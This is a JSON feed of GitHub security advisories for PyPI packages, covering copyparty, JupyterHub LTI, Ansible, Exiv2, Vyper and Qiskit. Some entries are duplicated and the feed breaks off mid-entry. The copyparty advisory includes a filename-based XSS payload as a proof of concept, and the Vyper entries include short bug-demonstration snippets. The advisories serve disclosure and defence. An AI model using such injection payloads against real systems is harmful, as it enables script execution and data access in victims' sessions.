{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>A <a href=\"https://capec.mitre.org/data/definitions/588.html\">DOM-Based XSS</a> was discovered in <a href=\"https://github.com/9001/copyparty\">copyparty</a>, a portable fileserver. The vulnerability is considered low-risk.</p>\n<h2 id=\"details\">Details</h2>\n<p>By handing someone a maliciously-named file, and then tricking them into dragging the file into copyparty's Web-UI, an attacker could execute arbitrary javascript with the same privileges as that user. For example, this could give unintended read-access to files owned by that user. The bug is triggered by the drag-drop action itself; it is not necessary to actually initiate the upload. The file must be empty (zero bytes).</p>\n<p>Note: As a general-purpose webserver, it is intentionally possible to upload HTML-files with arbitrary javascript in <code>&lt;script&gt;</code> tags, which will execute when the file is opened. The difference is that this vulnerability would trigger execution of javascript during the act of uploading, and not when the uploaded file was opened.</p>\n<h2 id=\"proof-of-concept-poc\">Proof of Concept (POC)</h2>\n<ol>\n<li>Create an empty file named <code>&lt;img src=x onerror=\"alert(1)\"&gt;</code></li>\n<li>Drag-and-drop the file into the browser to initiate an upload</li>\n<li>The <code>alert(1)</code> is executed</li>\n</ol>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/9001/copyparty/security/advisories/GHSA-m2jw-cj8v-937r\">https://github.com/9001/copyparty/security/advisories/GHSA-m2jw-cj8v-937r</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27145\">https://nvd.nist.gov/vuln/detail/CVE-2025-27145</a></li>\n<li><a href=\"https://github.com/9001/copyparty/commit/438ea6ccb06f39d7cbb4b6ee7ad44606e21a63dd\">https://github.com/9001/copyparty/commit/438ea6ccb06f39d7cbb4b6ee7ad44606e21a63dd</a></li>\n<li><a href=\"https://github.com/9001/copyparty/releases/tag/v1.16.15\">https://github.com/9001/copyparty/releases/tag/v1.16.15</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m2jw-cj8v-937r\">https://github.com/advisories/GHSA-m2jw-cj8v-937r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m2jw-cj8v-937r",
            "title": "[copyparty] copyparty renders unsanitized filenames as HTML when user uploads empty files",
            "date_modified": "2025-02-26T20:06:58.000Z",
            "date_published": "2025-02-26T20:06:56.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m2jw-cj8v-937r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Only users that has configured a JupyterHub installation to use the authenticator class <code>LTI13Authenticator</code> are influenced.</p>\n<p>LTI13Authenticator that was introduced in <code>jupyterhub-ltiauthenticator</code> 1.3.0 wasn't validating JWT signatures. This is believed to allow the LTI13Authenticator to authorize a forged request granting access to existing and new user identities.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>None.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>None.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/jupyterhub/ltiauthenticator/blob/3feec2e81b9d3b0ad6b58ab4226af640833039f3/ltiauthenticator/lti13/validator.py#L122-L164\">This code segment</a> didn't validate a JWT signature.</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/jupyterhub/ltiauthenticator/security/advisories/GHSA-mcgx-2gcr-p3hp\">https://github.com/jupyterhub/ltiauthenticator/security/advisories/GHSA-mcgx-2gcr-p3hp</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-25574\">https://nvd.nist.gov/vuln/detail/CVE-2023-25574</a></li>\n<li><a href=\"https://github.com/jupyterhub/ltiauthenticator/blob/3feec2e81b9d3b0ad6b58ab4226af640833039f3/ltiauthenticator/lti13/validator.py#L122-L164\">https://github.com/jupyterhub/ltiauthenticator/blob/3feec2e81b9d3b0ad6b58ab4226af640833039f3/ltiauthenticator/lti13/validator.py#L122-L164</a></li>\n<li><a href=\"https://github.com/jupyterhub/ltiauthenticator/blob/main/CHANGELOG.md#140---2023-03-01\">https://github.com/jupyterhub/ltiauthenticator/blob/main/CHANGELOG.md#140---2023-03-01</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mcgx-2gcr-p3hp\">https://github.com/advisories/GHSA-mcgx-2gcr-p3hp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mcgx-2gcr-p3hp",
            "title": "[jupyterhub-ltiauthenticator] LTI JupyterHub Authenticator does not properly validate JWT Signature",
            "date_modified": "2025-02-25T17:48:35.000Z",
            "date_published": "2025-02-25T17:48:34.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mcgx-2gcr-p3hp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A flaw was found in Ansible, where sensitive information stored in Ansible Vault files can be exposed in plaintext during the execution of a playbook. This occurs when using tasks such as include_vars to load vaulted variables without setting the no_log: true parameter, resulting in sensitive data being printed in the playbook output or logs. This can lead to the unintentional disclosure of secrets like passwords or API keys, compromising security and potentially allowing unauthorized access or actions.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-8775\">https://nvd.nist.gov/vuln/detail/CVE-2024-8775</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2024-8775\">https://access.redhat.com/security/cve/CVE-2024-8775</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2312119\">https://bugzilla.redhat.com/show_bug.cgi?id=2312119</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2024:8969\">https://access.redhat.com/errata/RHSA-2024:8969</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2024:9894\">https://access.redhat.com/errata/RHSA-2024:9894</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2024:10762\">https://access.redhat.com/errata/RHSA-2024:10762</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2025:1249\">https://access.redhat.com/errata/RHSA-2025:1249</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jpxc-vmjf-9fcj\">https://github.com/advisories/GHSA-jpxc-vmjf-9fcj</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/8a87e1c5d37422bc99d27ad4237d185cc233e035\">https://github.com/ansible/ansible/commit/8a87e1c5d37422bc99d27ad4237d185cc233e035</a></li>\n<li><a href=\"https://github.com/ansible/ansible/blob/v2.16.13/changelogs/CHANGELOG-v2.16.rst#security-fixes\">https://github.com/ansible/ansible/blob/v2.16.13/changelogs/CHANGELOG-v2.16.rst#security-fixes</a></li>\n<li><a href=\"https://github.com/ansible/ansible/blob/v2.17.6/changelogs/CHANGELOG-v2.17.rst#security-fixes\">https://github.com/ansible/ansible/blob/v2.17.6/changelogs/CHANGELOG-v2.17.rst#security-fixes</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jpxc-vmjf-9fcj",
            "title": "[ansible-core] Ansible vulnerable to Insertion of Sensitive Information into Log File",
            "date_modified": "2025-02-24T15:15:39.000Z",
            "date_published": "2024-09-16T14:37:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jpxc-vmjf-9fcj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A flaw was found in Ansible, where sensitive information stored in Ansible Vault files can be exposed in plaintext during the execution of a playbook. This occurs when using tasks such as include_vars to load vaulted variables without setting the no_log: true parameter, resulting in sensitive data being printed in the playbook output or logs. This can lead to the unintentional disclosure of secrets like passwords or API keys, compromising security and potentially allowing unauthorized access or actions.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-8775\">https://nvd.nist.gov/vuln/detail/CVE-2024-8775</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2024-8775\">https://access.redhat.com/security/cve/CVE-2024-8775</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2312119\">https://bugzilla.redhat.com/show_bug.cgi?id=2312119</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2024:8969\">https://access.redhat.com/errata/RHSA-2024:8969</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2024:9894\">https://access.redhat.com/errata/RHSA-2024:9894</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2024:10762\">https://access.redhat.com/errata/RHSA-2024:10762</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2025:1249\">https://access.redhat.com/errata/RHSA-2025:1249</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jpxc-vmjf-9fcj\">https://github.com/advisories/GHSA-jpxc-vmjf-9fcj</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/8a87e1c5d37422bc99d27ad4237d185cc233e035\">https://github.com/ansible/ansible/commit/8a87e1c5d37422bc99d27ad4237d185cc233e035</a></li>\n<li><a href=\"https://github.com/ansible/ansible/blob/v2.16.13/changelogs/CHANGELOG-v2.16.rst#security-fixes\">https://github.com/ansible/ansible/blob/v2.16.13/changelogs/CHANGELOG-v2.16.rst#security-fixes</a></li>\n<li><a href=\"https://github.com/ansible/ansible/blob/v2.17.6/changelogs/CHANGELOG-v2.17.rst#security-fixes\">https://github.com/ansible/ansible/blob/v2.17.6/changelogs/CHANGELOG-v2.17.rst#security-fixes</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jpxc-vmjf-9fcj",
            "title": "[ansible-core] Ansible vulnerable to Insertion of Sensitive Information into Log File",
            "date_modified": "2025-02-24T15:15:39.000Z",
            "date_published": "2024-09-16T14:37:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jpxc-vmjf-9fcj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A heap buffer overflow was found in Exiv2 versions v0.28.0 to v0.28.4. Versions prior to v0.28.0, such as v0.27.7, are <strong>not</strong> affected. Exiv2 is a command-line utility and C++ library for reading, writing, deleting, and modifying the metadata of image files. The heap overflow is triggered when Exiv2 is used to write metadata into a crafted image file. An attacker could potentially exploit the vulnerability to gain code execution, if they can trick the victim into running Exiv2 on a crafted image file.</p>\n<p>Note that this bug is only triggered when writing the metadata, which is a less frequently used Exiv2 operation than reading the metadata. For example, to trigger the bug in the Exiv2 command-line application, you need to add an extra command-line argument such as <code>fixiso</code>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The bug is fixed in version v0.28.5.</p>\n<h3 id=\"references\">References</h3>\n<p>Issue: <a href=\"https://github.com/Exiv2/exiv2/issues/3168\">https://github.com/Exiv2/exiv2/issues/3168</a>\nFix: <a href=\"https://github.com/Exiv2/exiv2/pull/3174\">https://github.com/Exiv2/exiv2/pull/3174</a></p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please see our <a href=\"https://github.com/Exiv2/exiv2/security/policy\">security policy</a> for information about Exiv2 security.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/Exiv2/exiv2/security/advisories/GHSA-38h4-fx85-qcx7\">https://github.com/Exiv2/exiv2/security/advisories/GHSA-38h4-fx85-qcx7</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-26623\">https://nvd.nist.gov/vuln/detail/CVE-2025-26623</a></li>\n<li><a href=\"https://github.com/Exiv2/exiv2/issues/3168\">https://github.com/Exiv2/exiv2/issues/3168</a></li>\n<li><a href=\"https://github.com/Exiv2/exiv2/pull/3174\">https://github.com/Exiv2/exiv2/pull/3174</a></li>\n<li><a href=\"https://github.com/jim-easterbrook/python-exiv2/commit/4cc875e392f9e0bc705fe03d929b9a382b78dae4\">https://github.com/jim-easterbrook/python-exiv2/commit/4cc875e392f9e0bc705fe03d929b9a382b78dae4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-38h4-fx85-qcx7\">https://github.com/advisories/GHSA-38h4-fx85-qcx7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-38h4-fx85-qcx7",
            "title": "[Exiv2] Exiv2 allows Use After Free",
            "date_modified": "2025-02-21T23:53:06.000Z",
            "date_published": "2025-02-21T23:53:03.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-38h4-fx85-qcx7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Multiple evaluation of a single expression is possible in the iterator target of a for loop. While the iterator expression cannot produce multiple writes, it can consume side effects produced in the loop body (e.g. read a storage variable updated in the loop body) and thus lead to unexpected program behavior. Specifically, reads in iterators which contain an ifexp (e.g. <code>for s: uint256 in ([read(), read()] if True else [])</code>) may interleave reads with writes in the loop body.</p>\n<p>The fix is tracked in <a href=\"https://github.com/vyperlang/vyper/pull/4488\">https://github.com/vyperlang/vyper/pull/4488</a>.</p>\n<h3 id=\"vulnerability-details\">Vulnerability Details</h3>\n<p>Vyper for loops allow two kinds of iterator targets, namely the <code>range()</code> builtin and an iterable type, like SArray and DArray. </p>\n<p>During codegen, iterable lists are required to not produce any side-effects (in the following code, <code>range_scope</code> forces <code>iter_list</code> to be parsed in a constant context, which is checked against <code>is_constant</code>).</p>\n<pre><code class=\"language-python\">def _parse_For_list(self):\n    with self.context.range_scope():\n        iter_list = Expr(self.stmt.iter, self.context).ir_node\n    ...\n\ndef range_scope(self):\n    prev_value = self.in_range_expr\n    self.in_range_expr = True\n    yield\n    self.in_range_expr = prev_value\n\ndef is_constant(self):\n    return self.constancy is Constancy.Constant or self.in_range_expr\n</code></pre>\n<p>However, this does not prevent the iterator from consuming side effects provided by the body of the loop. For dynamic arrays, the compiler simply panics:</p>\n<pre><code class=\"language-vyper\">x: DynArray[uint256, 3]\n\n@external\ndef test():\n    for i: uint256 in (self.usesideeffect() if True else self.usesideeffect()):\n        pass\n\n@view\ndef usesideeffect() -&gt; DynArray[uint256, 3]:\n    return self.x\n</code></pre>\n<p>For SArrays on the other hand, <code>iter_list</code> is instantiated in the body of a <code>repeat</code> ir, so it can be evaluated several times.</p>\n<p>Here are three illustrating examples. In the first example, the following test case pre-evaluates the iter list and stores the result to a temporary list in memory. So the list is only evaluated once, before entry into the loop body, and the log output will be 0, 0, 0.</p>\n<pre><code class=\"language-vyper\">event I:\n    i: uint256\n\nx: uint256\n\n@deploy\ndef __init__():\n    self.x = 0\n\n@external\ndef test():\n    for i: uint256 in [self.usesideeffect(), self.usesideeffect(), self.usesideeffect()]:\n        self.x += 1\n        log I(i)\n\n@view\ndef usesideeffect() -&gt; uint256:\n    return self.x\n</code></pre>\n<p>However, in the next two examples, because the iterator target is not a list literal, it will be evaluated in the loop body. In the second example, <code>iter_list</code> is an ifexp, thus it will be evaluated lazily in the loop body. The log output will be 0, 1, 2 due to consumption of side effects.</p>\n<pre><code class=\"language-vyper\">event I:\n    i: uint256\n\nx: uint256\n\n@deploy\ndef __init__():\n    self.x = 0\n\n@external\ndef test():\n    for i: uint256 in ([self.usesideeffect(), self.usesideeffect(), self.usesideeffect()] if True else self.otherclause()):\n        self.x += 1\n        log I(i)\n\n@view\ndef usesideeffect() -&gt; uint256:\n    return self.x\n\n@view\ndef otherclause() -&gt; uint256[3]:\n    return [0, 0, 0]\n</code></pre>\n<p>In the third example, <code>iter_list</code> is also an ifexp, thus it will only be evaluated in the loop body. The log output will be 0, 1, 2 due to consumption of side effects.</p>\n<pre><code class=\"language-vyper\">event I:\n    i: uint256\n\nx: uint256[3]\n\n@deploy\ndef __init__():\n    self.x = [0, 0, 0]\n\n@external\ndef test():\n    for i: uint256 in (self.usesideeffect() if True else self.otherclause()):\n        self.x[0] += 1\n        self.x[1] += 1\n        self.x[2] += 1\n        log I(i)\n\n@view\ndef usesideeffect() -&gt; uint256[3]:\n    return self.x\n\n@view\ndef otherclause() -&gt; uint256[3]:\n    return [0, 0, 0]\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vyperlang/vyper/security/advisories/GHSA-h33q-mhmp-8p67\">https://github.com/vyperlang/vyper/security/advisories/GHSA-h33q-mhmp-8p67</a></li>\n<li><a href=\"https://github.com/vyperlang/vyper/pull/4488\">https://github.com/vyperlang/vyper/pull/4488</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27104\">https://nvd.nist.gov/vuln/detail/CVE-2025-27104</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h33q-mhmp-8p67\">https://github.com/advisories/GHSA-h33q-mhmp-8p67</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h33q-mhmp-8p67",
            "title": "[vyper] Vyper has a double eval in For List Iter",
            "date_modified": "2025-02-24T20:26:23.000Z",
            "date_published": "2025-02-21T22:43:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h33q-mhmp-8p67"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Vyper handles AugAssign statements by first caching the target location to avoid double evaluation. However, in the case when target is an access to a DynArray and the rhs modifies the array, the cached target will evaluate first, and the bounds check will not be re-evaluated during the write portion of the statement. In other words, the following code</p>\n<pre><code class=\"language-vyper\">def poc():\n    a: DynArray[uint256, 2] = [1, 2]\n    a[1] += a.pop()\n</code></pre>\n<p>is equivalent to:</p>\n<pre><code class=\"language-vyper\">def poc():\n    a: DynArray[uint256, 2] = [1, 2]\n    a[1] += a[len(a) - 1]\n    a.pop()\n</code></pre>\n<p>rather than:</p>\n<pre><code class=\"language-vyper\">def poc():\n    a: DynArray[uint256, 2] = [1, 2]\n    s: uint256 = a[1]\n    t: uint256 = a.pop()\n    a[1] = s + t  # reverts due to oob access\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vyperlang/vyper/security/advisories/GHSA-4w26-8p97-f4jp\">https://github.com/vyperlang/vyper/security/advisories/GHSA-4w26-8p97-f4jp</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27105\">https://nvd.nist.gov/vuln/detail/CVE-2025-27105</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4w26-8p97-f4jp\">https://github.com/advisories/GHSA-4w26-8p97-f4jp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4w26-8p97-f4jp",
            "title": "[vyper] AugAssign evaluation order causing OOB write within the object in Vyper",
            "date_modified": "2025-02-24T20:25:11.000Z",
            "date_published": "2025-02-21T22:43:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4w26-8p97-f4jp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Vyper's <code>sqrt()</code> builtin uses the babylonian method to calculate square roots of decimals. Unfortunately, improper handling of the oscillating final states may lead to sqrt incorrectly returning rounded up results.</p>\n<p>the fix is tracked in <a href=\"https://github.com/vyperlang/vyper/pull/4486\">https://github.com/vyperlang/vyper/pull/4486</a></p>\n<h3 id=\"vulnerability-details\">Vulnerability Details</h3>\n<p>Vyper injects the following code to handle calculation of decimal sqrt. x is the input provided by user.</p>\n<pre><code class=\"language-python\">assert x &gt;= 0.0\nz: decimal = 0.0\n\nif x == 0.0:\n    z = 0.0\nelse:\n    z = x / 2.0 + 0.5\n    y: decimal = x\n\n    for i: uint256 in range(256):\n        if z == y:\n            break\n        y = z\n        z = (x / z + z) / 2.0\n</code></pre>\n<p>Notably, the terminal condition of the algorithm is either <code>z_cur == z_prev</code>, or the algorithm runs for 256 rounds.</p>\n<p>However, for certain inputs, <code>z</code> might actually oscillate between <code>N</code> and <code>N + epsilon</code>, where <code>N ** 2 &lt;= x &lt; (N + epsilon) ** 2</code>. This means that the current behavior does not define whether it will round up or down to the nearest epsilon.</p>\n<p>The example snippet here returns 0.9999999999, the rounded up result for sqrt(0.9999999998). This is due to the oscillation ending in N + epsilon instead of N.</p>\n<pre><code class=\"language-vyper\">@external\ndef test():\n    d: decimal = 0.9999999998\n    r: decimal = sqrt(d)    #this will be 0.9999999999\n</code></pre>\n<p>Note that <code>sqrt()</code> diverges from <code>isqrt()</code> here -- <code>isqrt()</code> consistently rounds down, so it is not subject to the same issue.</p>\n<h3 id=\"impact-details\">Impact Details</h3>\n<p>Since <code>sqrt()</code> can be used for determining boundary conditions, rounding down is preferred. However, since <code>sqrt()</code> is used very rarely in the wild, this advisory has been assigned an impact of <code>low</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vyperlang/vyper/security/advisories/GHSA-2p94-8669-xg86\">https://github.com/vyperlang/vyper/security/advisories/GHSA-2p94-8669-xg86</a></li>\n<li><a href=\"https://github.com/vyperlang/vyper/pull/4486\">https://github.com/vyperlang/vyper/pull/4486</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-26622\">https://nvd.nist.gov/vuln/detail/CVE-2025-26622</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2p94-8669-xg86\">https://github.com/advisories/GHSA-2p94-8669-xg86</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2p94-8669-xg86",
            "title": "[vyper] Vyper's sqrt doesn't define rounding behavior",
            "date_modified": "2025-02-24T20:23:52.000Z",
            "date_published": "2025-02-21T22:43:30.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2p94-8669-xg86"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A maliciously crafted QPY file containing a malformed <code>symengine</code> serialization stream as part of the larger QPY serialization of a <code>ParameterExpression</code> object can cause a segfault within the <code>symengine</code> library, allowing an attacker to terminate the hosting process deserializing the QPY payload.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This issue is addressed in 1.3.0 when using QPY format version 13. QPY format versions 10, 11, and 12 are all still inherently vulnerable if they are using symengine symbolic encoding and <code>symengine &lt;= 0.13.0</code> is installed in the deserializing environment (as of publishing there is no newer compatible release of symengine available). Using QPY 13 is strongly recommended for this reason.</p>\n<p>The symengine 0.14.0 release has addressed the segfault issue, but it is backward incompatible and will not work with any Qiskit release; it also prevents loading a payload generated with any other version of symengine. Using QPY 13 is strongly recommended for this reason.</p>\n<p>It is also strongly suggested to patch the locally installed version of symengine in the deserializing environment to prevent the specific segfault. The commit [1] can be applied on top of symengine 0.13.0 and used to build a patched python library that will not segfault in the presence of a malformed payload and instead raise a <code>RuntimeError</code> which will address the vulnerability.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>As QPY is backwards compatible <code>qiskit.qpy.load()</code> function will always attempt to deserialize the <code>symengine</code>-serialized payloads in QPY format versions 10, 11, and 12. These are any payloads generated with the <code>use_symengine</code> argument on <code>qiskit.qpy.dump()</code> set to <code>True</code> (which is the default value starting in Qiskit 1.0.0. The only option is to disallow parsing if those QPY formats are being read and the <code>use_symengine</code> flag was set in the file's header. You can detect whether a payload is potentially vulnerable by using the following function built using the Python standard library:</p>\n<pre><code class=\"language-python\">import struct\nfrom collections import namedtuple\n\n\ndef check_qpy_payload(path: str) -&gt; bool:\n    \"\"\"Function to check if a QPY payload is potentially vulnerable to a symengine vulnerability.\n\n    Args:\n        path: The path to the QPY file\n\n    Returns:\n        Whether the specified payload is potentially vulnerable. If ``True`` the conditions for\n        being vulnerable exist, however the payload may not be vulnerable it can't be detected\n        until trying to deserialize.\n    \"\"\"\n    with open(path, \"rb\") as file_obj:\n        version = struct.unpack(\"!6sB\", file_obj.read(7))[1]\n        if version &lt; 10 or version &gt;= 13:\n            return False\n        file_obj.seek(0)\n        header_tuple = namedtuple(\n            \"FILE_HEADER\",\n            [\n                \"preface\",\n                \"qpy_version\",\n                \"major_version\",\n                \"minor_version\",\n                \"patch_version\",\n                \"num_programs\",\n                \"symbolic_encoding\",\n            ],\n        )\n        header_pack_str = \"!6sBBBBQc\"\n        header_read_size = struct.calcsize(header_pack_str)\n        data = struct.unpack(header_pack_str, file_obj.read(header_read_size))\n        header = header_tuple(*data)\n        return header.symbolic_encoding == b\"e\"\n</code></pre>\n<p>Note, this function does <strong>not</strong> tell you whether the payload is malicious and will cause the segfault, just that conditions for it to be potentially malicious exist. It's not possible to know ahead of time whether <code>symengine</code> will segfault until the data is passed to that library.</p>\n<h3 id=\"references\">References</h3>\n<p>[1] <a href=\"https://github.com/symengine/symengine/commit/eb3e292bf13b2dfdf0fa1c132944af8df2bc7d51\">https://github.com/symengine/symengine/commit/eb3e292bf13b2dfdf0fa1c132944af8df2bc7d51</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/Qiskit/qiskit/security/advisories/GHSA-fpmr-m242-xm7x\">https://github.com/Qiskit/qiskit/security/advisories/GHSA-fpmr-m242-xm7x</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-1403\">https://nvd.nist.gov/vuln/detail/CVE-2025-1403</a></li>\n<li><a href=\"https://github.com/symengine/symengine/commit/eb3e292bf13b2dfdf0fa1c132944af8df2bc7d51\">https://github.com/symengine/symengine/commit/eb3e292bf13b2dfdf0fa1c132944af8df2bc7d51</a></li>\n<li><a href=\"https://www.ibm.com/support/pages/node/7183868\">https://www.ibm.com/support/pages/node/7183868</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fpmr-m242-xm7x\">https://github.com/advisories/GHSA-fpmr-m242-xm7x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fpmr-m242-xm7x",
            "title": "[qiskit-terra] Malciously crafted QPY files can allows Remote Attackers to Cause Denial of Service in Qiskit",
            "date_modified": "2025-02-21T21:42:45.000Z",
            "date_published": "2025-02-21T21:42:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fpmr-m242-xm7x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A maliciously crafted QPY file containing a malformed <code>symengine</code> serialization stream as part of the larger QPY serialization of a <code>ParameterExpression</code> object can cause a segfault within the <code>symengine</code> library, allowing an attacker to terminate the hosting process deserializing the QPY payload.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This issue is addressed in 1.3.0 when using QPY format version 13. QPY format versions 10, 11, and 12 are all still inherently vulnerable if they are using symengine symbolic encoding and <code>symengine &lt;= 0.13.0</code> is installed in the deserializing environment (as of publishing there is no newer compatible release of symengine available). Using QPY 13 is strongly recommended for this reason.</p>\n<p>The symengine 0.14.0 release has addressed the segfault issue, but it is backward incompatible and will not work with any Qiskit release; it also prevents loading a payload generated with any other version of symengine. Using QPY 13 is strongly recommended for this reason.</p>\n<p>It is also strongly suggested to patch the locally installed version of symengine in the deserializing environment to prevent the specific segfault. The commit [1] can be applied on top of symengine 0.13.0 and used to build a patched python library that will not segfault in the presence of a malformed payload and instead raise a <code>RuntimeError</code> which will address the vulnerability.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>As QPY is backwards compatible <code>qiskit.qpy.load()</code> function will always attempt to deserialize the <code>symengine</code>-serialized payloads in QPY format versions 10, 11, and 12. These are any payloads generated with the <code>use_symengine</code> argument on <code>qiskit.qpy.dump()</code> set to <code>True</code> (which is the default value starting in Qiskit 1.0.0. The only option is to disallow parsing if those QPY formats are being read and the <code>use_symengine</code> flag was set in the file's header. You can detect whether a payload is potentially vulnerable by using the following function built using the Python standard library:</p>\n<pre><code class=\"language-python\">import struct\nfrom collections import namedtuple\n\n\ndef check_qpy_payload(path: str) -&gt; bool:\n    \"\"\"Function to check if a QPY payload is potentially vulnerable to a symengine vulnerability.\n\n    Args:\n        path: The path to the QPY file\n\n    Returns:\n        Whether the specified payload is potentially vulnerable. If ``True`` the conditions for\n        being vulnerable exist, however the payload may not be vulnerable it can't be detected\n        until trying to deserialize.\n    \"\"\"\n    with open(path, \"rb\") as file_obj:\n        version = struct.unpack(\"!6sB\", file_obj.read(7))[1]\n        if version &lt; 10 or version &gt;= 13:\n            return False\n        file_obj.seek(0)\n        header_tuple = namedtuple(\n            \"FILE_HEADER\",\n            [\n                \"preface\",\n                \"qpy_version\",\n                \"major_version\",\n                \"minor_version\",\n                \"patch_version\",\n                \"num_programs\",\n                \"symbolic_encoding\",\n            ],\n        )\n        header_pack_str = \"!6sBBBBQc\"\n        header_read_size = struct.calcsize(header_pack_str)\n        data = struct.unpack(header_pack_str, file_obj.read(header_read_size))\n        header = header_tuple(*data)\n        return header.symbolic_encoding == b\"e\"\n</code></pre>\n<p>Note, this function does <strong>not</strong> tell you whether the payload is malicious and will cause the segfault, just that conditions for it to be potentially malicious exist. It's not possible to know ahead of time whether <code>symengine</code> will segfault until the data is passed to that library.</p>\n<h3 id=\"references\">References</h3>\n<p>[1] <a href=\"https://github.com/symengine/symengine/commit/eb3e292bf13b2dfdf0fa1c132944af8df2bc7d51\">https://github.com/symengine/symengine/commit/eb3e292bf13b2dfdf0fa1c132944af8df2bc7d51</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/Qiskit/qiskit/security/advisories/GHSA-fpmr-m242-xm7x\">https://github.com/Qiskit/qiskit/security/advisories/GHSA-fpmr-m242-xm7x</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-1403\">https://nvd.nist.gov/vuln/detail/CVE-2025-1403</a></li>\n<li><a 